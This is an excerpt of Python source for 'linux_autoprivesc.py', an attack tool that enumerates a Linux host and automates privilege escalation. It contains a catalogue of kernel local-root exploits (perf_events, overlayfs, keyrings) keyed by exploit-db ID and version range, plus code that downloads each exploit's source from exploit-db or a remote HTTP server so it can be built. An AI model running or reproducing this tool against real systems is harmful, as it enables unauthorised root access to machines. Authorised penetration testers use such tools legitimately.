...
###############################################################################################################
## [Title]: linux_autoprivesc.py -- a Linux Privilege Escalation Check Script
## [Author]: Akos Rajtmar (westerneer) -- @MrMonkeyFuzzer
##-------------------------------------------------------------------------------------------------------------
## Many thanks for the original author:
...
## [Update]:
## The linux_autoprivesc.py modification features a local repository creation method and an automatic exploit
## fetcher and builder functionality.
##-------------------------------------------------------------------------------------------------------------
## [Warning]:
...
parser.add_option("-a", "--all",
				  action="store_true", dest="optAll", default=False,
				  help="Perform all the checking and exploiting functions. It needs the remote or local exploit database.")

parser.add_option("-i", "--info",
				  action="store_true", dest="optInfo", default=False,
				  help="Information gathering from the host system.")

parser.add_option("-f", "--file",
				  action="store_true", dest="optFile", default=False,
				  help="File and directory privileges enumeration.")

parser.add_option("-p", "--process",
				  action="store_true", dest="optProc", default=False,
				  help="Running processes and installed applications.")

parser.add_option("-e", "--enumerate",
				  action="store_true", dest="optEnum", default=False,
				  help="Enumerate exploits, which are compatible with the target system.")

parser.add_option("-x", "--exploit",
				  action="store_true", dest="optExp", default=False,
				  help="Enumerate and build all exploits, it needs the remote or local exploit database.")

parser.add_option("-r", "--remote",
				  action="store", type="string", dest="optRemote", metavar="http://URL:PORT/TO/EXPLOIT/DATABASE/",
				  help="URL of the remote HTTP server to get the exploits from.")

parser.add_option("-l", "--local",
				  action="store", type="string", dest="optLocal", metavar="/PATH/TO/EXPLOIT/DATABASE/",
				  help="Path for the local database to get the exploits from.")

parser.add_option("-b", "--build",
				  action="store", type="string", dest="optBuild", metavar="/PATH/TO/EXPLOIT/DATABASE/",
				  help="Build the exploit database to the given Path. Requires Internet connection.")
...
if options.optInfo == True  or options.optAll == True or options.optProc == True or options.optEnum == True or options.optExp == True:
	# Basic system info
...
if options.optFile == True or options.optAll == True:
...
if options.optProc == True or options.optAll == True:
...
"Linux Kernel 2.6.37 <= 3.x.x - PERF_EVENTS Local Root Exploit":{"minver":"2.6.37", "maxver":"3.8.9", "exploitdb":"25444", "lang":"c", "arch":"x86_64", "keywords":{"loc":["kernel"], "val":"kernel"}},
"Linux Kernel < 3.8.9 - x86_64 perf_swevent_init Local Root Exploit":{"minver":"2.6.37", "maxver":"3.8.9", "exploitdb":"26131", "lang":"c", "arch":"x86_64", "keywords":{"loc":["kernel"], "val":"kernel"}},
"Linux Kernel <= 3.13 - Local Privilege Escalation PoC (gid)":{"minver":"3.0", "maxver":"3.15.1", "exploitdb":"33824", "lang":"c", "arch":"*", "keywords":{"loc":["kernel"], "val":"kernel"}},
"Linux Kernel overlayfs - Local Privilege Escalation":{"minver":"3.0", "maxver":"4.3.3", "exploitdb":"39230", "lang":"c", "arch":"*", "keywords":{"loc":["kernel"], "val":"kernel"}},
"Ubuntu 14.04 LTS, 15.10 overlayfs":{"minver":"3.0", "maxver":"4.3.3", "exploitdb":"39166", "lang":"c", "arch":"*", "keywords":{"loc":["kernel"], "val":"kernel"}},
"Linux Kernel REFCOUNT Overflow/Use-After-Free in Keyrings":{"minver":"3.8", "maxver":"4.4", "exploitdb":"39277", "lang":"c", "arch":"*", "keywords":{"loc":["kernel"], "val":"kernel"}}
}

# https://www.exploit-db.com/search/?order_by=date&order=desc&pg=4&action=search&platform=16&type=2

if options.optEnum == True or options.optAll == True or options.optExp == True:
	# EXPLOIT ENUMERATION
...
if options.optBuild != None:
	if os.path.isdir(options.optBuild) == False:
		print("The path " + options.optBuild + " doesn't exist.")
		sys.exit(1)

	os.path.join(options.optBuild, "")
	
	for exploit in sploits:
		print("https://exploit-db.com/download/" + sploits[exploit]["exploitdb"])
		urllib.urlretrieve ("https://exploit-db.com/download/" + sploits[exploit]["exploitdb"], options.optBuild + sploits[exploit]["exploitdb"] + "." + sploits[exploit]["lang"])
